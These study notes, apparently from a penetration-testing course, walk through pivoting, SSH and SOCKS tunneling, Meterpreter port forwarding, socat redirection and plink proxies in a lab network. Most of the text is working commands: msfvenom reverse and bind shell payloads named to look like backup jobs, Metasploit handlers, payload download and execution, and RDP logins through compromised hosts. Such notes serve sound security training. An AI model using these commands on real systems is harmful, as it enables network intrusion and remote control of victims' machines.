# Introduction to Pivoting, Tunneling, and Port Forwarding
## Pivoting
- **Definition**: Using a compromised host to move into unreachable network segments.
- **Purpose**: Access isolated networks by defeating segmentation (physical or virtual).
- **Key Steps**:
  - Check privileges, network connections, and VPN/remote access.
  - Identify multi-adapter hosts to move across network segments.
- **Terms**: Pivot Host, Proxy, Foothold, Beachhead System, Jump Host.
- **Example**: Using a dual-homed workstation to cross enterprise and operational network boundaries.

---

## Lateral Movement
- **Definition**: Technique to move across hosts, services, or applications within the same network.
- **Purpose**: Expand access, escalate privileges, and compromise additional systems.
- **Example**:
  - Gain initial access → Find more hosts → Use same credentials to compromise other hosts.
- **Resources**:
  - [Palo Alto Networks Explanation](https://www.paloaltonetworks.com)
  - [MITRE Explanation](https://attack.mitre.org)

---

## Tunneling
- **Definition**: Encapsulating traffic into another protocol to hide its intent and route through barriers.
- **Purpose**: Obfuscate actions, avoid detection, and enable secure data transfer (e.g., payload delivery, C2 traffic).
- **Techniques**:
  - Use protocols like HTTPS, HTTP, or SSH to mask traffic.
  - Example: Hiding C2 traffic in HTTP GET/POST requests to appear as normal web traffic.

---

## Comparison
| **Aspect**        | **Lateral Movement**                      | **Pivoting**                              | **Tunneling**                             |
|--------------------|-------------------------------------------|-------------------------------------------|-------------------------------------------|
| **Objective**     | Expand within the same network            | Cross network boundaries                  | Obfuscate/mask traffic                    |
| **Scope**         | Hosts, applications, and services         | Network segments                          | Protocols for secure/encrypted transport  |
| **Example**       | Reuse credentials on multiple hosts       | Use dual-homed host to cross networks     | Hide C2 traffic in HTTP requests          |

---
# The Networking Behind Pivoting
## IP Addressing & NICs
- **IP Address:** Essential for communication on any network.
  - **Dynamic IPs**: Assigned by DHCP servers.
  - **Static IPs**: Common for critical devices (e.g., servers, routers, printers).
- **NIC (Network Interface Controller):** 
  - Each NIC is tied to an IP address. 
  - Multiple NICs = Multiple networks.
- **Tools to Check NICs:**
  - **Linux/macOS:**
    ```
    ifconfig
    ```
  - **Windows:**
    ```
    ipconfig
    ```

### Example: `ifconfig` Output
```bash
eth0: inet 134.122.100.200 (Public IP)
eth1: inet 10.106.0.172 (Private IP)
tun0: inet 10.10.15.54 (VPN)
lo: inet 127.0.0.1 (Loopback)
```
- **Public vs. Private IPs:**  
  - **Public IPs:** Routable over the internet.  
  - **Private IPs:** Internal use; require NAT for internet access.

---

## Routing
- **Routing Table:** Maps destinations to interfaces or gateways.
  - **Linux Command:**
    ```
    netstat -r
    ```
    or
    ```
    ip route
    ```
  - **Example:**
    ```bash
    Destination     Gateway         Iface
    default         178.62.64.1     eth0
    10.10.10.0      10.10.14.1      tun0
    ```
  - **Default Route:** Used for unknown networks.

- **Key Terms:**
  - **Gateway:** IP of the device forwarding traffic (e.g., router).
  - **Pivoting Tip:** Identify routes to new networks from compromised hosts.

---

## Protocols, Services & Ports
- **Protocols:** Rules for communication (e.g., HTTP, SSH, SMB).
- **Ports:**
  - Logical identifiers for applications on a device.
  - **Example:**
    - Port 80 (HTTP): Open for web server traffic.
  - **Pivoting Tip:** Use firewall-allowed ports to create backdoors (e.g., reverse shells).

---

# Dynamic Port Forwarding with SSH and SOCKS Tunneling

## What is Port Forwarding?  
- Redirects traffic from one port to another.  
- Uses **TCP** for communication.  
- Encapsulates forwarded traffic using protocols like **SSH** or **SOCKS**.  
- Helps bypass firewalls and pivot to other networks.

---

## SSH Local Port Forwarding  

### Scenario:  
- Attack host: `10.10.15.x`.  
- Target server: `10.129.x.x`.  
- **Goal**: Access MySQL (local to the server on port `3306`) from your machine.  

### Steps:  

1. **Scan Target for Open Ports**  
   ```bash
   nmap -sT -p22,3306 10.129.202.64
   ```
   - Output:  
     - Port `22` (SSH): **Open**.  
     - Port `3306` (MySQL): **Closed** for external access.  

2. **Forward Local Port with SSH**  
   ```bash
   ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
   ```
   - **Command Breakdown**:  
     - `-L`: Forward local port.  
     - `1234`: Local port on your machine.  
     - `localhost:3306`: Target's MySQL port.  

3. **Verify Forwarding**  
   - Check using `netstat`:  
     ```bash
     netstat -antp | grep 1234
     ```
   - Verify with `nmap`:  
     ```bash
     nmap -v -sV -p1234 localhost
     ```
     - Output: Port `1234/tcp` now connects to MySQL.

4. **Access MySQL Locally**  
   - Use `127.0.0.1:1234` to connect.  

---

## Why Port Forward?  
- **MySQL is local to the target** (binds to `localhost`).  
- Without forwarding, remote exploits/tools can’t access it.  
- Forwarding makes MySQL accessible on your local machine.

---

### Forward Multiple Ports  
- Example: Forward MySQL (`3306`) and Apache (`80`).  
   ```bash
   ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
   ```

---
## Setting up to Pivot

You're looking to set up a pivot using dynamic port forwarding through SSH and SOCKS tunneling to scan a network that is not directly accessible from your attack host. Here’s a summary of the steps you’ve outlined:

#### 1. **Identify Interfaces**
- Use `ifconfig` to identify the network interfaces.
  - `ens192`: The interface connected to your attack host.
  - `ens224`: The interface communicating with a different network (172.16.5.0/23).
  - `lo`: The loopback interface.

#### 2. **Setup SSH for Dynamic Port Forwarding**
- On the compromised Ubuntu host (`WEB01`), establish an SSH connection with dynamic port forwarding using the `-D` option, which sets up a SOCKS proxy:
  ```bash
  ssh -D 9050 ubuntu@10.129.202.64
  ```
  - The `-D 9050` option tells the SSH server to listen on your local machine’s port 9050 and forward traffic via SSH to the 172.16.5.0/23 network.

#### 3. **Configure Proxychains**
- Modify the `/etc/proxychains.conf` file to route traffic through the SOCKS proxy:
  ```bash
  tail -4 /etc/proxychains.conf
  socks4 127.0.0.1 9050
  ```
- This configuration ensures that any tools you use with proxychains will send their traffic through the SOCKS proxy on port 9050.

#### 4. **Scan with Nmap via Proxychains**
- Use proxychains with Nmap to perform a network scan over the SSH tunnel:
  ```bash
  proxychains nmap -v -sn 172.16.5.1-200
  ```
  - The `-sn` flag tells Nmap to perform a ping scan (to find live hosts).
  - The traffic will be forwarded via SSH to the remote network (172.16.5.0/23).

#### 5. **Target Specific Host Scan**
- If you know a specific host (e.g., `172.16.5.19`), you can perform a more detailed scan:
  ```bash
  proxychains nmap -v -Pn -sT 172.16.5.19
  ```
  - The `-Pn` flag disables host discovery, assuming the host is up.
  - The `-sT` flag performs a full TCP connect scan.

#### 6. **Use Metasploit via Proxychains**
- You can also pivot traffic through Metasploit, using `proxychains`:
  ```bash
  proxychains msfconsole
  ```
  - This ensures that all Metasploit traffic is routed through the SOCKS proxy for attacks on the target network.

use the **rdp_scanner auxiliary module** to check if the host on the internal network is listening on **3389**.

#### Using xfreerdp with Proxychains
```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
The xfreerdp command will require an RDP certificate to be accepted before successfully establishing the session. After accepting it, we should have an RDP session, pivoting via the Ubuntu server.

### Additional Notes:
- **Proxychains Limitations**: Proxychains only supports full TCP connect scans. If you use partial packet scans (like SYN scans), they may not work properly.
- **Firewall Considerations**: Windows machines may block ICMP (ping) by default, so host discovery checks (ping scans) might not be effective.

This approach allows you to bypass firewall restrictions and scan the network behind the compromised host.

# Remote/Reverse Port Forwarding with SSH

#### Scenario Overview:
- **Windows Target (Windows A)**: The target machine you want to exploit, which is only able to make outgoing connections to the `172.16.5.0/23` network (local network).
- **Pivot Host (Ubuntu Server)**: A host that has connectivity to both the attack host and the Windows target. It will forward traffic between the two.
- **Attack Host (Your Machine)**: The machine you're using to attack the Windows target, running tools like Metasploit to handle the payload connection.

#### Steps to Achieve Pivoting via SSH and Meterpreter Shell:

---

### 1. **Create Meterpreter Payload**:
   - Use **msfvenom** to generate a Meterpreter payload that will connect back to your listener on the attack host via the pivot host.
   - **Command**:
     ```bash
     msfvenom -p windows/x64/meterpreter/reverse_https lhost=<PivotHostIP> LPORT=8080 -f exe -o backupscript.exe
     ```
     - `lhost=<PivotHostIP>`: The IP of the pivot host (Ubuntu server), which will receive the reverse connection.
     - `LPORT=8080`: The port on the pivot host that the payload will use to connect back.
     - `-f exe`: The payload format (Windows executable).
     - `-o backupscript.exe`: Output the payload as an executable file named `backupscript.exe`.

   - **Output**: 
     - Payload size: 712 bytes.
     - Final exe size: 7168 bytes.
     - Saved as `backupscript.exe`.

---

### 2. **Configure Metasploit Handler**:
   - You need to set up a **Metasploit handler** on the attack host to listen for the reverse connection.
   - **Steps**:
     - Start `msfconsole` and use the appropriate exploit handler.
     - **Command**:
       ```bash
       msfconsole
       use exploit/multi/handler
       set payload windows/x64/meterpreter/reverse_https
       set lhost 0.0.0.0
       set lport 8000
       run
       ```
     - `payload windows/x64/meterpreter/reverse_https`: This configures Metasploit to use a reverse HTTPS Meterpreter payload.
     - `lhost 0.0.0.0`: Listen on all interfaces (useful for receiving connections on the attack host).
     - `lport 8000`: Listen on port 8000 for incoming connections.
   
   - **Output**:
     - **Metasploit** will start listening for incoming HTTPS reverse connections on `https://0.0.0.0:8000`.

---

### 3. **Transfer Payload to Pivot Host**:
   - You need to move the payload from your attack host to the pivot host (Ubuntu server).
   - **Command** (using `scp`):
     ```bash
     scp backupscript.exe ubuntu@<PivotHostIP>:~/
     ```
     - This copies the `backupscript.exe` to the home directory of the pivot host.

---

### 4. **Start HTTP Server on Pivot Host**:
   - On the pivot host (Ubuntu), you'll need to serve the payload over HTTP so the Windows target can download it.
   - **Command** (using Python3):
     ```bash
     python3 -m http.server 8123
     ```
     - This starts a simple HTTP server on port `8123` to host the payload. The Windows target will download it from this server.

---

### 5. **Download Payload on Windows Target**:
   - On the Windows target, use **PowerShell** to download the payload from the pivot host:
   - **Command**:
     ```powershell
     Invoke-WebRequest -Uri "http://<PivotHostIP>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
     ```
     - This downloads the payload (`backupscript.exe`) to the `C:\` directory on the Windows target.

---

### 6. **Set Up SSH Remote Port Forwarding**:
   - **SSH Remote Port Forwarding**: This step involves using SSH to forward traffic from the pivot host's port `8080` to the attack host's port `8000` (where your Metasploit listener is running).
   - **Command**:
     ```bash
     ssh -R <PivotHostIP>:8080:0.0.0.0:8000 ubuntu@<TargetIP> -vN
     ```
     - `-R <PivotHostIP>:8080:0.0.0.0:8000`: This forwards incoming traffic on the pivot host's IP address at port 8080 to the attack host's `0.0.0.0:8000` (Metasploit listener).
     - `-vN`: Verbose output for debugging and to avoid interactive login shell.

   - The **pivot host** will now forward any incoming connection on `8080` to the attack host's port `8000` where Metasploit is listening.

---

### 7. **Execute Payload on Windows Target**:
   - On the Windows target, run the payload you downloaded (`C:\backupscript.exe`).
   - This will trigger the reverse shell connection back to the pivot host, which will forward it to the attack host via SSH.

---

### 8. **Metasploit Listener Logs (Pivot Host)**:
   - You can monitor the logs on the pivot host to ensure the connection is being forwarded properly.
   - **Logs** (Example):
     ```
     debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
     debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
     debug1: channel 1: new [172.16.5.19]
     debug1: confirm forwarded-tcpip
     ```

   - These logs show the connection attempt from the Windows target (`172.16.5.19`) being forwarded via the pivot to the attack host.

---

### 9. **Meterpreter Session**:
   - Once the reverse shell is triggered, you'll see the following in Metasploit:
   - **Output**:
     ```
     Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1) at 2022-03-02 10:48:10 -0500
     ```
   - The **Meterpreter** session will show as coming from `127.0.0.1` (loopback) because the pivot host is forwarding the connection.
   - Use the `shell` command to interact with the target shell:
     ```bash
     meterpreter > shell
     C:\> netstat
     ```

---
# Meterpreter Tunneling & Port Forwarding
#### **Creating Payload for Ubuntu Pivot Host**
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```
- **Purpose**: Creates a Meterpreter reverse TCP payload for a Linux target (Ubuntu in this case).
- **Explanation**: 
  - `LHOST=10.10.14.18`: Set the attacker's local IP address.
  - `LPORT=8080`: Set the listening port on the attacker's machine.
  - `-f elf`: Specifies that the payload will be generated as an ELF executable.
  - The output is saved as `backupjob`, which will be transferred to the pivot host for execution.

#### **Configuring & Starting the multi/handler**
```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```
- **Purpose**: Configures and starts a Metasploit handler to listen for the incoming reverse connection from the payload.
- **Explanation**:
  - `set lhost 0.0.0.0`: Binds to all interfaces on the attacker's machine to receive the connection.
  - `set lport 8080`: Specifies the port to listen on (must match the payload's `LPORT`).
  - `run`: Starts the handler, waiting for the payload to connect back and establish a Meterpreter session.

#### **Executing the Payload on Pivot Host**
```bash
ubuntu@WebServer:~$ ls
backupjob
ubuntu@WebServer:~$ chmod +x backupjob
ubuntu@WebServer:~$ ./backupjob
```
- **Purpose**: Executes the payload (`backupjob`) on the pivot host to establish a Meterpreter session.
- **Explanation**: 
  - The payload is made executable using `chmod +x backupjob`.
  - Then, it is executed to trigger the reverse TCP connection to the attacker's machine.

#### **Meterpreter Session Established**
```bash
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 )
meterpreter > pwd
/home/ubuntu
```
- **Purpose**: Confirms that the Meterpreter session has been successfully established.
- **Explanation**: 
  - `pwd`: Shows the current working directory of the session (`/home/ubuntu`), confirming access to the Ubuntu host.

#### **Ping Sweep on Target Network (172.16.5.0/23)**
```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
- **Purpose**: Performs a ping sweep across the specified target subnet to identify live hosts.
- **Explanation**: 
  - The `ping_sweep` post-exploitation module sends ICMP requests to all hosts in the `172.16.5.0/23` range and reports back the reachable IPs.

#### **Ping Sweep for Loop (Linux Pivot)**
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
- **Purpose**: Executes a parallel ping sweep on the `172.16.5.0/23` network.
- **Explanation**: 
  - A for loop sends one ping request (`ping -c 1`) to each host from `172.16.5.1` to `172.16.5.254`.
  - `grep "bytes from"` filters the output to show only successful replies.
  - The `&` allows the pings to run in parallel for faster scanning.
#### ping sweep powershell
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```
#### ping sweep cmd 
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
#### **SOCKS Proxy Configuration**
```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```
- **Purpose**: Configures Metasploit's SOCKS proxy server to route traffic through the Meterpreter session.
- **Explanation**: 
  - `SRVPORT 9050`: Sets the local port for the SOCKS proxy (commonly used for Tor traffic).
  - `SRVHOST 0.0.0.0`: Allows connections from any interface (so it's accessible to the attacker's machine).
  - `version 4a`: Configures the SOCKS proxy to use SOCKS4a (commonly used with Metasploit).
  - `run`: Starts the SOCKS proxy server.

#### **Adding Proxy to proxychains.conf**
```bash
socks4  127.0.0.1 9050
```
- **Purpose**: Configures `proxychains` to route traffic through the SOCKS proxy.
- **Explanation**: 
  - Adds the proxy to the `/etc/proxychains.conf` file, allowing tools like Nmap to route their traffic via the SOCKS proxy server running on `127.0.0.1:9050`.

#### **Creating Routes with AutoRoute**
```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```
- **Purpose**: Configures Metasploit to route traffic from the attacker's machine through the compromised Ubuntu pivot host.
- **Explanation**: 
  - `SESSION 1`: Specifies the Meterpreter session to use for routing.
  - `SUBNET 172.16.5.0`: Adds the target subnet `172.16.5.0/23` to the routing table, allowing traffic to be forwarded via the Meterpreter session.

#### **Listing Active Routes**
```bash
meterpreter > run autoroute -p
```
- **Purpose**: Lists the active routes in the routing table, confirming the new routes for the target network.
- **Explanation**: Displays the subnets and gateways that are accessible through the Meterpreter session.

#### **Testing Proxy & Routing Functionality**
```bash
$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```
- **Purpose**: Uses `proxychains` to route an Nmap scan through the Meterpreter session and test network connectivity to the target.
- **Explanation**: 
  - The `-p3389` option scans port `3389` (RDP) on the target IP `172.16.5.19`.
  - `-sT`: Performs a TCP connect scan.
  - `-v`: Enables verbose output.
  - `-Pn`: Disables host discovery (assumes the host is up).
  
**Output**:
```bash
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
- **Explanation**: Nmap discovers that port `3389` (RDP) is open on `172.16.5.19`, indicating that the scan successfully routed through the Meterpreter session.

## Meterpreter Port Forwarding

#### **Port Forwarding Command Syntax**
```bash
portfwd [-h] [add | delete | list | flush] [args]
```

#### **Options**
- `-h`: Help banner
- `-i <opt>`: Index of the port forward entry
- `-l <opt>`: Local port to listen on (for forwards) or connect to (for reverse)
- `-L <opt>`: Local host to listen on (optional)
- `-p <opt>`: Remote port to connect to (for forwards) or listen on (for reverse)
- `-r <opt>`: Remote host to connect to
- `-R`: Indicates reverse port forward

---

#### **Creating Local TCP Relay**
```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```
- Listens on **local port 3300**.
- Forwards traffic to **172.16.5.19:3389** (RDP port).

##### **Connecting via Localhost**
```bash
$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

##### **Check Active Connections (Netstat)**
```bash
$ netstat -antp
tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp
```

---

#### **Meterpreter Reverse Port Forwarding**
```bash
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```
- Forwards **incoming traffic on Ubuntu port 1234** to **attack host port 8081**.

---

#### **Configuring and Running Listener (`multi/handler`)**
```bash
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081
set LHOST 0.0.0.0
run
```

---

#### **Generate Reverse Shell Payload**
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

---

#### **Executing the Payload and Opening Meterpreter Session**
```bash
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173)
meterpreter > shell
```
- **Meterpreter session** is opened after executing the payload.

# **Socat Redirection with a Reverse Shell**

#### **What is Socat?**
- **Socat** is a powerful tool that acts as a bidirectional relay between two independent network connections.
- It can:
  - Redirect traffic from one host and port to another.
  - Handle advanced setups like SSL, raw sockets, or Unix domain sockets.
  - Create pipe-like connections between applications, replacing the need for more complex tunneling setups.

#### **How is Socat Different from Normal Port Forwarding?**
- **Normal Port Forwarding:**
  - Typically handled by tools like SSH.
  - Requires SSH access to the system performing the forwarding.
  - Simpler but less flexible (e.g., may not handle different socket types or advanced configurations).

- **Socat:**
  - Does not require SSH; can operate independently on systems without SSH access.
  - Offers advanced features, like working with different socket types (e.g., TCP, UDP, SSL, UNIX).
  - Flexible configurations allow relaying, modifying, or interacting with network traffic more dynamically.

---

#### **Key Steps**

1. **Set up Socat as a redirector:**
   - Socat listens on a local port and forwards traffic to the attacker's host and port.
   ```bash
   socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
   ```
   - **Explanation:** 
     - `TCP4-LISTEN:8080` listens on port 8080.
     - `fork` allows handling multiple simultaneous connections.
     - `TCP4:10.10.14.18:80` forwards traffic to the attacker's host (`10.10.14.18`) on port 80.

2. **Create a payload that connects to Socat:**
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
   ```
   - **Payload details:** A reverse HTTPS payload connecting to `172.16.5.129:8080`.

3. **Transfer the payload to the target (e.g., using SCP or SMB).**

4. **Start Metasploit handler to catch the shell:**
   - **Steps:**
     ```bash
     msfconsole
     use exploit/multi/handler
     set payload windows/x64/meterpreter/reverse_https
     set lhost 0.0.0.0
     set lport 80
     run
     ```
   - **Explanation:** Listens on all interfaces (`0.0.0.0`) and port `80` for incoming connections from Socat.

5. **Run the payload on the target host.**
   - The payload sends a reverse shell connection to Socat (`172.16.5.129:8080`), which redirects it to the Metasploit listener (`10.10.14.18:80`).

6. **Receive a Meterpreter session in Metasploit:**
   ```plaintext
   [*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 )
   meterpreter > getuid
   Server username: INLANEFREIGHT\victor
   ```

---

# Socat Redirection with a Bind Shell
#### **What is a Bind Shell?**
- A **Bind Shell** is when the target machine (in this case, Windows) opens a port and listens for incoming connections from the attacker.
- The attacker connects to this port to interact with the system.
- Unlike reverse shells, where the attacker waits for a connection from the victim, bind shells allow the victim to listen and wait for an attacker’s connection.

#### **How to Set Up a Bind Shell with Socat and Metasploit**

1. **Create the Windows Bind Shell Payload:**
   - Use `msfvenom` to create a Windows bind shell payload:
   ```bash
   msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
   ```
   - **Explanation:**
     - This generates a payload that listens on port `8443` on the Windows machine.

2. **Start the Socat Listener on Ubuntu:**
   - Socat will forward connections from a listener on port `8080` to port `8443` on the Windows machine.
   ```bash
   socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
   ```
   - **Explanation:**
     - `TCP4-LISTEN:8080` makes Socat listen for incoming connections on port `8080`.
     - `TCP4:172.16.5.19:8443` forwards the traffic to the Windows target machine’s `8443` port.

3. **Start Metasploit's Bind Handler:**
   - Configure Metasploit to connect to Socat's listener, which is on `8080`.
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload windows/x64/meterpreter/bind_tcp
   set RHOST 10.129.202.64
   set LPORT 8080
   run
   ```
   - **Explanation:**
     - `RHOST` is set to the Ubuntu server's IP (`10.129.202.64`) where Socat listens.
     - `LPORT` is the port Metasploit uses to connect to Socat's listener (`8080`).

4. **Execute the Payload on the Windows Target:**
   - Once the payload is executed on the target machine, it will open port `8443` for incoming connections.
   - Socat will redirect the connection to the Windows machine.

5. **Receive the Meterpreter Session:**
   - The handler in Metasploit will open a connection to the bind shell through Socat and receive the Meterpreter session.
   ```plaintext
   [*] Sending stage (200262 bytes) to 10.129.202.64
   [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
   meterpreter > getuid
   Server username: INLANEFREIGHT\victor
   ```

---

# **Using Plink.exe for SSH and SOCKS Proxy on Windows**

## **Overview**
- Use **Plink.exe** (part of PuTTY) to create a SOCKS proxy on a Windows machine during a pentest.
- Enables pivoting without introducing new tools, ideal for locked-down environments.

---

## **Steps**
1. **Create SOCKS Proxy with Plink**:
   ```bash
   plink -ssh -D 9050 ubuntu@10.129.15.50
   ```
   - `-D 9050`: Sets up SOCKS proxy on port 9050.
   - SSH connects to `ubuntu@10.129.15.50`.

2. **Configure Proxifier**:
   - **Address**: `127.0.0.1`
   - **Port**: `9050`
   - Use SOCKS v5 for routing traffic.

3. **Tunnel RDP**:
   - Start **mstsc.exe** (RDP) to connect to the target host.
   - Traffic is routed through the SOCKS proxy.

---

# SSH Pivoting with Sshuttle
